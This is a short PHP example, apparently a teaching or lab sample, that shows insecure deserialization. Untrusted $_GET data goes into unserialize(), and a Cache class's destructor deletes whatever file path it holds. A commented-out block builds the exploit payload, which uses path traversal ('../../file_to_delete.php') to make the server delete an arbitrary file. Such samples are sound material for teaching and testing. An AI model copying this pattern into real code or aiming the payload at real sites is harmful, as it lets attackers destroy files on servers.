<?php
class Cache {
	public $cacheFile;
	
	function __destruct() {
		$file = "/var/www/cache/tmp/{$this->cacheFile}";
		if (file_exists($file)) {
			@unlink($file);
		}
	}
}

/*
$cache = new Cache();
$cache->cacheFile = '../../file_to_delete.php';
echo urlencode(serialize($cache));
//*/

$userData = unserialize($_GET['data']);
?>